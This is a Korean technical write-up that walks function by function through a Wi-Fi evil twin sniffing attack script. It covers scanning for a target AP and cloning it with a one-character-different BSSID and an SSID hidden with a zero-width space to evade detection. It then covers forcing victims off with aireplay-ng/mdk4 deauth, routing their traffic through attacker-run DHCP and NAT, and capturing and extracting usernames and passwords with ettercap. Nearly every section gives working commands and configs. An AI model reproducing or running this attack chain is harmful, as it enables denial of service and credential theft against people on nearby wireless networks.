# wfsat.sh 실행 흐름 정리

> **현재 파일 구조**
> | 파일 | 역할 |
> |------|------|
> | `wfsat.sh` | 공통 함수 라이브러리 (565줄) |
> | `et_sniffing_attack.sh` | Evil Twin Sniffing 공격 단독 실행 스크립트 |
> | `et_scan.sh` | 주변 AP 스캔 → `et_config.conf` 자동 저장 |
> | `et_config.conf` | 공격 설정값 저장 파일 |

---

## 전체 실행 흐름

```
[1단계] sudo ./et_scan.sh
         └─ 모니터 모드 활성화
         └─ airodump-ng 스캔 (15초)
         └─ AP 목록 출력 → 사용자 선택
         └─ et_config.conf에 bssid/essid/channel 저장
         └─ Managed 모드 복구 (자동)

[2단계] sudo ./et_sniffing_attack.sh
         └─ et_config.conf 로드
         └─ Pre-run validation (root 확인, 설정값 확인)
         └─ exec_et_sniffing_attack()
              ├─ set_hostapd_config   → Fake AP 설정 파일 생성
              ├─ launch_fake_ap       → Fake AP 신호 송출 (hostapd)
              ├─ set_network_interface_data → IP 대역 설정
              ├─ set_dhcp_config      → DHCP 설정 파일 생성
              ├─ set_std_internet_routing_rules → IP포워딩 + NAT + iptables
              ├─ launch_dhcp_server   → DHCP 서버 실행
              ├─ exec_et_deauth       → DoS 공격 시작
              ├─ launch_ettercap_sniffing → 트래픽 스니핑 시작
              ├─ set_et_control_script → 종료 스크립트 생성
              ├─ launch_et_control_window → Control 창 실행
              └─ write_et_processes  → PID 파일 기록
                    ↓ [Ctrl+C 입력 시 _et_cleanup 호출]
              ├─ kill_et_windows      → 모든 프로세스 종료
              ├─ recover_current_channel → 채널 복구 (추적 모드 시)
              ├─ clean_initialize_iptables_nftables → 방화벽 규칙 정리
              ├─ restore_et_interface → 인터페이스 원상복구
              ├─ parse_ettercap_log  → 캡처된 패스워드 추출
              └─ clean_tmpfiles      → 임시 파일 정리
```

---

## 0. et_config.conf — 설정 파일

`et_sniffing_attack.sh`가 소스로 읽어 들이는 설정 파일.
`et_scan.sh`가 스캔 결과를 이 파일에 자동으로 기록한다.

```bash
interface="wlan0"           # 공격에 사용할 무선 인터페이스
internet_interface="eth0"   # 인터넷 연결된 인터페이스 (피해자에게 인터넷 제공용)
phy_interface=""            # 물리 인터페이스 (비어 있으면 자동 탐지)

# 타겟 AP 정보 (et_scan.sh가 채움)
bssid="58:86:94:49:8C:C6"
essid="deemo2.4"
channel="11"

# DoS 방식: "Auth DoS" | "Aireplay" | "mdk4 deauth"
et_dos_attack="Aireplay"

ettercap_log=1                           # 1 = 로그 저장
ettercap_logpath="/tmp/et_sniffing_captured.txt"
dos_pursuit_mode=0                       # 1 = DoS 추적 모드
mac_spoofing_desired=0                   # 1 = MAC 스푸핑
country_code="00"
standard_80211n=0
standard_80211ac=0
standard_80211ax=0
standard_80211be=0
```

---

## 1. et_scan.sh — AP 스캔 스크립트

공격 전 타겟 AP를 선택하고 설정을 저장하는 보조 스크립트.

### 실행 흐름

| 단계 | 동작 | 설명 |
|------|------|------|
| 1 | `et_config.conf` 로드 | `interface` 등 초기 설정 읽기 |
| 2 | root 확인 | 비root → 종료 |
| 3 | phy 인터페이스 탐지 | `iw dev ${interface} info` → `phy0` 등 |
| 4 | 모니터 모드 활성화 | `airmon-ng check kill` → `iw set type monitor` |
| 5 | airodump-ng 스캔 | 기본 15초 (`SCAN_DURATION` 환경변수로 변경 가능) |
| 6 | CSV 파싱 | AP 섹션만 추출, BSSID·채널·신호강도·SSID 파싱 |
| 7 | AP 목록 출력 | 신호 강도 순으로 정렬하여 번호 매김 |
| 8 | 사용자 선택 | AP가 1개뿐이면 자동 선택 |
| 9 | `et_config.conf` 업데이트 | `bssid`, `essid`, `channel`, `phy_interface` 저장 |
| 10 | Managed 모드 복구 | EXIT trap으로 자동 실행 |

### AP 목록 출력 예시
```
================================================================================
 Num  BSSID              CH    Sig%  ENC     ESSID
================================================================================
 1    58:86:94:49:8C:C6  11     72%  WPA2    deemo2.4
 2    AA:BB:CC:DD:EE:FF  6      45%  WPA2    iptime
================================================================================
[?] Select AP number (1-2):
```

### update_config_value()
`et_config.conf` 내 특정 키의 값을 `awk`로 안전하게 교체하는 헬퍼 함수.
특수문자(따옴표, 슬래시 등)가 포함된 SSID도 정상 처리됨.
```bash
update_config_value "bssid"   "58:86:94:49:8C:C6"
update_config_value "essid"   "deemo2.4"
update_config_value "channel" "11"
```

---

## 2. et_sniffing_attack.sh — Pre-run Validation

스크립트 최하단의 실행부. `exec_et_sniffing_attack()`을 호출하기 전 검증을 수행한다.

```bash
# 시작 정보 출력
echo "[*] Starting Evil Twin Sniffing Attack..."
echo "    Target BSSID : ${bssid}"
echo "    Target ESSID : ${essid}"
echo "    Channel      : ${channel}"
echo "    Interface    : ${interface}"
echo "    DoS method   : ${et_dos_attack}"
```

| 단계 | 코드 | 설명 |
|------|------|------|
| 1 | `id -u` 확인 | 비root → 종료 |
| 2 | 필수 변수 확인 | `interface`, `internet_interface`, `bssid`, `essid`, `channel`, `et_dos_attack` |
| 3 | `phy_interface` 탐지 | 비어있으면 `physical_interface_finder`로 자동 탐지 |
| 4 | `detect_distro_window_ratios` | 배포판별 xterm 창 비율 설정 |
| 5 | `tmpdir` 생성 | `/tmp/ag1/` (인스턴스 번호에 따라 자동 결정) |
| 6 | `check_interface_supported_bands` | 인터페이스 2.4GHz/5GHz 지원 여부 확인 |
| → | `exec_et_sniffing_attack()` | **공격 시작** |

---

## 3. exec_et_sniffing_attack() — `et_sniffing_attack.sh`

실제 공격 실행 함수. 순서대로 실행된다.

```bash
trap '_et_cleanup' SIGINT SIGTERM   # Ctrl+C 시 _et_cleanup 호출
```

### 인터페이스 Managed 모드 전환

Fake AP(hostapd)를 실행하려면 인터페이스가 **Managed 모드**여야 한다.
(기존 `wfast.sh`에서는 `prepare_et_interface()`가 담당하던 역할)

```bash
ip link set "${interface}" down
iw "${interface}" set type managed   # airmon 없이 iw 직접 사용
ip link set "${interface}" up
echo "[+] Interface ready."
```

### 실행 순서

| 단계 | 함수 | echo 출력 | 역할 |
|------|------|-----------|------|
| 1 | `set_hostapd_config` | `[*] Generating hostapd config...` | Fake AP 설정 파일 생성 |
| 2 | `launch_fake_ap` | `[+] Fake AP launched.` | Fake AP 실행 (hostapd) |
| 3 | `set_network_interface_data` | `[*] Configuring network interface...` | IP 대역 설정 |
| 4 | `set_dhcp_config` | (연속 실행) | DHCP 설정 파일 생성 |
| 5 | `set_std_internet_routing_rules` | `[+] Routing configured.` | iptables 라우팅 규칙 설정 |
| 6 | `launch_dhcp_server` | `[+] DHCP server running.` | DHCP 서버 실행 |
| 7 | `exec_et_deauth` | `[+] Deauth started.` | DoS 공격 실행 |
| 8 | `launch_ettercap_sniffing` | `[+] Sniffer running.` | 트래픽 스니핑 시작 |
| 9 | `set_et_control_script` | `[*] Setting up control window...` | 종료 제어 스크립트 생성 |
| 10 | `launch_et_control_window` | (연속 실행) | Control 창 실행 |
| 11 | `write_et_processes` | `[+] All components running.` | PID 기록 후 Ctrl+C 대기 |

---

## 4. _et_cleanup() — Ctrl+C 종료 핸들러

`exec_et_sniffing_attack()`에서 `trap '_et_cleanup' SIGINT SIGTERM`으로 등록.
Ctrl+C 입력 시 자동 호출된다.

```bash
function _et_cleanup() {
    echo "[*] Stopping Evil Twin attack..."
    echo "[*] Killing attack windows..."
    kill_et_windows

    if [ "${dos_pursuit_mode}" -eq 1 ]; then
        recover_current_channel
    fi

    echo "[*] Cleaning up iptables rules..."
    clean_initialize_iptables_nftables "end"

    echo "[*] Restoring interface..."
    restore_et_interface

    if [ "${ettercap_log}" -eq 1 ]; then
        echo "[*] Parsing ettercap log..."
        parse_ettercap_log
    fi

    echo "[*] Cleaning up temp files..."
    clean_tmpfiles "exit_script"
    echo "[+] Cleanup complete."
    exit 0
}
```

| 단계 | 함수 | 조건 |
|------|------|------|
| 1 | `kill_et_windows` | 항상 |
| 2 | `recover_current_channel` | `dos_pursuit_mode=1` 시 |
| 3 | `clean_initialize_iptables_nftables "end"` | 항상 |
| 4 | `restore_et_interface` | 항상 |
| 5 | `parse_ettercap_log` | `ettercap_log=1` 시 |
| 6 | `clean_tmpfiles "exit_script"` | 항상 |

---

## 5. 주요 함수 상세

### set_hostapd_config

#### 실행 순서
1. `get_hostapd_version()` — hostapd 버전 확인 (버전에 따라 지원 옵션 다름)
2. `rm -rf /tmp/ag1/ag.hostapd.conf` — 기존 설정 파일 삭제
3. `generate_fake_bssid()` — 진짜 BSSID와 한 글자만 다른 가짜 BSSID 생성
4. `generate_fake_essid()` — SSID 끝에 눈에 보이지 않는 ZWSP 문자 추가
5. 설정값들을 파일에 기록

#### generate_fake_bssid()
진짜 BSSID의 11번째 문자(hex)를 랜덤으로 변경해서 가짜 BSSID 생성.
MAC 스푸핑을 안 했을 때 사용. 진짜와 최대한 비슷하게 만들어 피해자 기기가 새 AP로 인식하지 않도록 함.
```
진짜: 58:86:94:49:8C:C6
가짜: 58:86:94:49:8B:C6  ← 한 글자만 다름
```

#### generate_fake_essid()
SSID 끝에 Zero Width Space(ZWSP, \xE2\x80\x8B) 유니코드 문자를 추가.
화면에는 동일하게 보이지만 내부적으로는 다른 SSID → 보안 도구의 동일 SSID 감지 우회.
```
진짜: "deemo2.4"
가짜: "deemo2.4​"  ← 육안으로는 동일하게 보임
```

#### 생성 위치
`/tmp/ag1/ag.hostapd.conf`
- `tmpdir` = `/tmp/ag1/` (인스턴스 번호에 따라 ag1, ag2... 자동 결정)

#### 생성되는 파일 내용
```
interface=wlan0
driver=nl80211
ssid=deemo2.4
bssid=58:86:94:49:8C:C6
channel=6
wpa=0               ← 암호화 없음 (Open AP, 피해자가 비밀번호 없이 연결되게)
ignore_broadcast_ssid=0
hw_mode=g           ← 2.4GHz (채널 14 이하)
ieee80211n=1        ← 지원 시 추가
```

조건부 추가 옵션:
| 조건 | 추가되는 옵션 |
|------|-------------|
| 채널 > 14 | `hw_mode=a` (5GHz) |
| 국가 코드 설정됨 | `country_code=KR` 등 |
| 802.11n 지원 | `ieee80211n=1` |
| 802.11ac 지원 | `ieee80211ac=1` |
| 802.11ax 지원 | `ieee80211ax=1` |
| 802.11be + hostapd 버전 충족 | `ieee80211be=1` |

#### 파일 생명주기
| 종료 방식 | 결과 |
|----------|------|
| 정상 종료 (Ctrl+C → _et_cleanup) | `clean_tmpfiles "exit_script"` → `/tmp/ag1/` 전체 삭제 |
| 비정상 종료 (강제 kill 등) | `/tmp/ag1/ag.hostapd.conf` 파일 남아있음 |

---

### launch_fake_ap

#### hostapd란?
무선 랜카드를 공유기처럼 동작하게 만들어주는 프로그램.
- 실행 위치: `/usr/sbin/hostapd`
- 설정 파일을 읽어서 그대로 AP를 생성
- 실행되면 피해자 WiFi 목록에 Fake AP 신호가 잡히기 시작

| 상태 | 랜카드 역할 |
|------|------------|
| hostapd 없이 | 클라이언트 (다른 AP에 접속) |
| hostapd 실행 후 | AP (직접 신호 송출) |

#### 라인별 동작
```bash
# 1. NetworkManager 강제 종료
airmon check kill
# NetworkManager가 살아있으면 hostapd와 충돌 → Fake AP 실행 실패

# 2. MAC 스푸핑 적용 (선택 시)
set_spoofed_mac "${interface}"
# /sys/class/net/wlan0/address 에서 현재 MAC 읽어 저장 (복구용)
# /dev/urandom 으로 랜덤 MAC 생성
# ip link set wlan0 down → MAC 변경 → ip link set wlan0 up

# 3. 화면 해상도 재측정 → 창 크기/위치 계산
recalculate_windows_sizes

# 4. 실행 명령어 조합
command="hostapd /tmp/ag1/ag.hostapd.conf"

# 5. 창 위치 결정 (et_sniffing → 3번 구역)
hostapd_scr_window_position=${g3_topleft_window}

# 6. 새 xterm 창 열고 hostapd 백그라운드 실행
manage_output "-hold -bg #000000 -fg #00FF00 -T AP" "${command}" "AP"
# → xterm -hold -bg "#000000" -fg "#00FF00" -T "AP" -e "hostapd /tmp/ag1/ag.hostapd.conf" &

# 7. PID 저장 (나중에 종료할 때 사용)
et_processes+=($!)

# 8. hostapd 초기화 대기
sleep 3
```

#### manage_output()
새 터미널 창을 열고 그 안에서 명령어를 실행하는 래퍼 함수.
- xterm 모드: `xterm [옵션] -e "[명령어]" &`
- tmux 모드: `start_tmux_processes`로 새 패널 생성
- 인자: `"창 옵션"` `"실행할 명령어"` `"창 이름"`

#### launch_fake_ap 실행 후 상태
- ✅ Fake AP 신호 송출 중 (피해자 WiFi 목록에 보임)
- ❌ DHCP 서버 없음 → 연결해도 IP 못 받음
- ❌ 인터넷 라우팅 없음
- ❌ DoS 아직 시작 안 됨

---

### set_network_interface_data

**Fake AP 네트워크에서 사용할 IP 주소 범위를 설정**하는 함수.

#### IP를 4개 변수로 분리하는 이유
충돌 시 3번째 옥텟만 숫자 연산으로 변경하기 위함.
```bash
# 문자열로 관리하면 변경 불가
ip_range="192.169.1.0"

# 분리하면 숫자 연산으로 간단히 변경
third_octet=$((third_octet + 1))
# 192.169.1.0 → 192.169.2.0 → 192.169.3.0 ...
```

#### 기본 IP 대역
`192.169.x.x` 사용 — `192.168.x.x`가 아닌 이유는 공격자 시스템의 기존 네트워크와 충돌 방지.

#### IP 충돌 체크
```bash
if ip route | grep 192.169.1.0 > /dev/null; then
    # 이미 사용 중이면 third_octet을 1씩 증가하며 빈 대역 탐색
    while true; do
        third_octet=$((third_octet + 1))
        if ! ip route | grep ${ip_range} > /dev/null; then break; fi
    done
fi
```

#### 최종 설정 변수
| 변수 | 값 | 역할 |
|------|-----|------|
| `et_ip_range` | 192.169.1.0 | 네트워크 주소 |
| `et_ip_router` | 192.169.1.1 | Fake AP 게이트웨이 (공격자 IP) |
| `et_broadcast_ip` | 192.169.1.255 | 브로드캐스트 |
| `et_range_start` | 192.169.1.33 | DHCP 할당 시작 |
| `et_range_stop` | 192.169.1.100 | DHCP 할당 끝 |

피해자가 연결되면 192.169.1.33~100 사이의 IP를 받고 게이트웨이가 공격자(192.169.1.1)로 설정되어 **모든 트래픽이 공격자를 거쳐가게 됨**.

---

### set_dhcp_config

**DHCP 서버 설정 파일(`/tmp/ag1/ag.dhcpd.conf`)을 생성**하는 함수.

#### 라인별 설명
```bash
rm -rf "${tmpdir}${dhcpd_file}"   # 기존 설정 파일 삭제
rm -rf "${tmpdir}clts.txt"        # 기존 클라이언트 목록 삭제
ip link set "${interface}" up     # 인터페이스 활성화
```

```bash
authoritative;              # 이 DHCP 서버가 네트워크 주인임을 선언
default-lease-time 600;     # IP 임대 기본 시간 10분
max-lease-time 7200;        # IP 임대 최대 시간 2시간
```

#### 모드별 DNS 분기
| 모드 | DNS | 이유 |
|------|-----|------|
| et_sniffing | 진짜 DNS (8.8.8.8 등) | 피해자가 정상 인터넷 사용하면서 트래픽 스니핑 |
| captive_portal | 공격자 IP (192.169.1.1) | 모든 도메인을 가짜 페이지로 redirect |

#### 생성되는 파일 내용
```
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.169.1.0 netmask 255.255.255.0 {
    option broadcast-address 192.169.1.255;
    option routers 192.169.1.1;
    option subnet-mask 255.255.255.0;
    option domain-name-servers 8.8.8.8, 8.8.4.4;
    range 192.169.1.33 192.169.1.100;
}
```

---

### launch_dhcp_server

새 xterm 창을 열고 **dhcpd(DHCP 서버)를 실행**하는 함수.

```bash
dhcpd -d -cf "/tmp/ag1/ag.dhcpd.conf" wlan0 2>&1 | tee -a /tmp/ag1/clts.txt
```

- `-d` → 데몬 모드 비활성 (창에서 직접 출력)
- `-cf` → 설정 파일 경로 지정
- `tee -a clts.txt` → DHCP 할당 내역을 `clts.txt`에 기록 (피해자 접속 로그)
- 창 색상: 검정 바탕 + **분홍 글씨**
- `sleep 2` → DHCP 서버 초기화 대기

이 시점부터 피해자가 Fake AP에 연결되면 **IP를 자동으로 받을 수 있게 됨.**

---

### exec_et_deauth

**DoS 공격(deauth)을 실행**하는 함수. 진짜 AP와 피해자의 연결을 강제로 끊음.

#### DoS 방식별 명령어
```bash
# Auth DoS → mdk4 사용 (et_config.conf의 et_dos_attack="Auth DoS")
mdk4 wlan0mon a -a 58:86:94:49:8C:C6 -m

# Aireplay 방식 (et_dos_attack="Aireplay")
# ※ -D 플래그 추가: 드라이버 의존성 무시 (일부 환경에서 필요)
aireplay-ng --deauth 0 -a 58:86:94:49:8C:C6 --ignore-negative-one -D wlan0mon

# mdk4 deauth 방식 (et_dos_attack="mdk4 deauth")
mdk4 wlan0mon d -b /tmp/ag1/bl.txt -c 6
```

> **변경사항**: Aireplay 명령어에 `-D` 플래그 추가됨.
> 일부 드라이버에서 발생하는 "unsupported" 오류를 무시하고 강제 실행.

- `prepare_et_monitor` → DoS용 모니터 모드 인터페이스 준비
- 창 색상: 검정 바탕 + **빨간 글씨**
- DoS 추적 모드(`dos_pursuit_mode=1`)일 때 → 피해자가 채널을 바꿔도 추적하며 계속 deauth

---

### launch_ettercap_sniffing

**ettercap을 실행해서 트래픽 스니핑을 시작**하는 함수.

```bash
ettercap -i wlan0 -q -T -z -S -u -l "/tmp/ag1/ag.ettercap"
```

- `-i wlan0` → Fake AP 인터페이스에서 캡처
- `-q` → 조용한 모드
- `-T` → 텍스트 모드
- `-z` → 비프로미스큐어스 모드
- `-S` → SSL 비활성
- `-u` → 유니코드 지원 비활성
- `-l` → 로그 저장 (`ettercap_log=1` 시)
- 창 색상: 검정 바탕 + **노란 글씨**

이 시점부터 Fake AP를 통해 오가는 **모든 트래픽이 캡처**됨.

---

### set_et_control_script

**공격 종료를 담당하는 별도 bash 스크립트를 `/tmp/ag1/` 에 생성**하는 함수.

생성되는 스크립트의 역할:
- `et_processes` 파일을 읽어서 **모든 프로세스 PID를 kill**
- captive_portal 모드라면 캡처된 패스워드 시도 횟수를 화면에 표시
- 사용자가 Enter를 누르면 이 스크립트가 실행되어 공격 종료

---

### launch_et_control_window

**Control 창을 열고 `set_et_control_script`에서 생성한 스크립트를 실행**하는 함수.

```bash
manage_output "-hold -bg #000000 -fg #FFFFFF -T Control" \
  "bash /tmp/ag1/ag.control_et.sh" "Control" "active"
```

- 창 색상: 검정 바탕 + **흰 글씨**
- `"active"` 인자 → 이 창이 포커스를 가짐 (사용자가 Enter를 입력하는 창)
- `et_process_control_window` 에 PID 저장

---

### write_et_processes

**실행 중인 모든 공격 프로세스 PID를 파일에 기록**하는 함수.

```bash
# et_processes 배열 → /tmp/ag1/ag.et_processes 파일에 기록
for item in "${et_processes[@]}"; do
    echo "${item}" >> "/tmp/ag1/ag.et_processes"
done
```

`set_et_control_script`에서 생성한 종료 스크립트가 이 파일을 읽어서 프로세스를 종료함.

---

### kill_et_windows

**모든 공격 프로세스를 종료**하는 함수.

```bash
# DoS 추적 모드 프로세스 종료
kill_dos_pursuit_mode_processes

# et_processes 배열의 모든 PID 재귀적으로 kill
for item in "${et_processes[@]}"; do
    kill_pid_and_children_recursive "${item}"
done

# Control 창 종료
kill "${et_process_control_window}"
```

---

### recover_current_channel

DoS 추적 모드 사용 시 **채널 파일에서 현재 채널을 복구**하는 함수.

```bash
recovered_channel=$(cat /tmp/ag1/ag.channelfile)
channel="${recovered_channel}"
```

공격 중 피해자를 추적하며 채널이 바뀌었을 수 있으므로 최종 채널값을 복구함.

---

### restore_et_interface

**공격 전 인터페이스 상태로 원상복구**하는 함수.

```bash
# IP 주소 제거
ip addr del "192.169.1.1/255.255.255.0" dev wlan0
ip route del "192.169.1.0/24" dev wlan0

# 공격 전 모드로 복구
if et_initial_state = "Managed":
    → Managed 모드 유지
else:
    → 다시 Monitor 모드로 전환 (airmon start)

# IP 포워딩 원래 값으로 복구
control_routing_status "end"
```

---

### parse_ettercap_log

**ettercap이 캡처한 로그에서 계정/패스워드를 추출**하는 함수.

```bash
etterlog -L -p -i "/tmp/ag1/ag.ettercap.eci" | grep -E "USER:|PASS:"
```

추출 후 결과 파일 형식:
```
2024-01-01
BSSID: 58:86:94:49:8C:C6
Channel: 6
ESSID: deemo2.4
---------------
USER: admin
PASS: password123
```

캡처된 패스워드가 있으면 `ettercap_logpath`에 저장, 없으면 "캡처된 패스워드 없음" 메시지 출력.

---

## 핵심 변수 정리

### et_config.conf에서 로드되는 변수

| 변수 | 설명 |
|------|------|
| `interface` | 주 무선 인터페이스 (예: wlan0) |
| `internet_interface` | 인터넷 연결 인터페이스 (예: eth0) |
| `phy_interface` | 물리 인터페이스 (예: phy0, 자동 탐지 가능) |
| `bssid` | 타겟 AP의 MAC 주소 |
| `essid` | 타겟 AP의 SSID |
| `channel` | 타겟 AP의 채널 |
| `et_dos_attack` | DoS 공격 방식 (`Auth DoS` / `Aireplay` / `mdk4 deauth`) |
| `ettercap_log` | ettercap 로그 저장 여부 (0/1) |
| `ettercap_logpath` | 로그 저장 경로 |
| `dos_pursuit_mode` | DoS 추적 모드 활성화 여부 (0/1) |
| `mac_spoofing_desired` | MAC 스푸핑 여부 (0/1) |
| `country_code` | 국가 코드 (예: KR, 00) |
| `standard_80211n/ac/ax/be` | 무선 표준 지원 여부 (0/1) |

---

## 임시 파일 목록 (`/tmp/ag1/`)

| 파일명 | 생성 시점 | 설명 |
|--------|-----------|------|
| `ag.hostapd.conf` | `set_hostapd_config` | Fake AP 설정 파일 |
| `ag.channelfile` | `exec_et_sniffing_attack` 시작 시 | 타겟 채널 번호 |
| `ag.dhcpd.conf` | `set_dhcp_config` | DHCP 서버 설정 파일 |
| `clts.txt` | `launch_dhcp_server` | DHCP 할당 내역 (피해자 접속 로그) |
| `ag.ettercap` | `launch_ettercap_sniffing` | ettercap 캡처 로그 |
| `ag.et_processes` | `write_et_processes` | 실행 중인 프로세스 PID |
| `ag.control_et.sh` | `set_et_control_script` | 공격 종료 제어 스크립트 |

정상 종료 시 `clean_tmpfiles "exit_script"` → `/tmp/ag1/` 전체 삭제.
비정상 종료(강제 kill 등) 시 파일이 남아있음 → 다음 실행 시 `set_hostapd_config`에서 삭제.

---

*다음 단계: et_scan.sh CSV 파싱 로직 및 et_sniffing_attack.sh 추가 함수 상세 분석*
